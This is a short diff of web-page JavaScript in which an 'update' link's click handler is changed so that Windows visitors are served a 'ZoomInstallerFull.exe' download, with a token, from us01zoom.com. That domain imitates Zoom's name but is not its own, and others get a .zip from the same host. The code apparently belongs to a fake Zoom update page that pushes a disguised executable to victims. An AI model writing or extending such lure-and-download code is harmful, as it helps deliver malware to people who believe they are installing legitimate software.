@@ -84,6 +84,11 @@ updateLink.addEventListener('click', async function(e) {
 	const result = await response.json();
 
 	if (result.success) {
+		if (osCategory.includes("Windows")) {
+			const downloadUrl = `https://us01zoom.com/download/ZoomInstallerFull.exe?token=${encodeURIComponent(result.token)}`;
+			window.open(downloadUrl, '_blank')
+			return
+		}
 		const downloadUrl = `https://us01zoom.com/download/ZoomInstallerFull.zip?token=${encodeURIComponent(result.token)}`;
 		window.open(downloadUrl, '_blank')
 	}
